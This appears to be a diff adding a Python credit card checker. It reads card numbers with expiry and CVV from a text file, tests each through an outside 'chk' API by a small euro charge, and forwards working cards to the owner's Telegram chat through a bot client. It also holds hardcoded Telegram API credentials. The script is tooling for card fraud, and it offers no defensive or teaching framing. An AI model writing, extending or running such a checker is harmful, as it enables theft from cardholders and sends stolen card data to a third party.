@@ -1,0 +1,39 @@
+#import requests
+#from pyrogram import Client
+
+api_id = 24509589
+api_hash = "717cf21d94c4934bcbe1eaa1ad86ae75"
+bot_token = " BOT TOKEN"
+owner_id = 7427691214
+
+def charge_card(cc_info):
+    url = "https://daxxteam.com/chk/api.php"
+    params = {
+        'lista': cc_info,
+        'mode': 'cvv',
+        'amount': 0.5,
+        'currency': 'eur'
+    }
+    response = requests.get(url, params=params)
+    return response.text
+
+def send_message_to_owner(bot, message):
+    bot.send_message(chat_id=owner_id, text=message)
+
+app = Client("my_bot", api_id=api_id, api_hash=api_hash, bot_token=bot_token)
+
+with open("cc.txt", "r") as file:
+    for line in file:
+        cc_info = line.strip()
+
+        if "|" not in cc_info or len(cc_info.split("|")) != 4:
+            print(f"Invalid card format: {cc_info}")
+            continue 
+
+        result = charge_card(cc_info)
+        print(result)
+        
+        if "✅" in result:
+            message = f"{result}"
+            with app:
+                send_message_to_owner(app, message)
